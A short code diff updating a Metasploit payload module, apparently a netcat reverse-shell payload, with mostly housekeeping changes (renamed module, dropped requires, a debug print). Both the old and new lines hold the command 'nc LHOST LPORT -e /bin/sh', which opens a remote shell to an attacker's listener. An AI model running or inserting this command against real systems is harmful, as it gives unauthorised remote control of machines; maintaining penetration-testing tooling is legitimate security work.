@@ -1,16 +1,12 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/core/handler/reverse_tcp'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
 
-module Metasploit3
+module MetasploitModule
 
-  CachedSize = 35
+  CachedSize = 34
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -39,6 +35,7 @@ module Metasploit3
   # Constructs the payload
   #
   def generate
+    vprint_good(command_string)
     return super + command_string
   end
 
@@ -46,7 +43,6 @@ module Metasploit3
   # Returns the command string to use for execution
   #
   def command_string
-    "nc #{datastore['LHOST']} #{datastore['LPORT']} -e /bin/sh "
+    "nc #{datastore['LHOST']} #{datastore['LPORT']} -e /bin/sh"
   end
-
 end
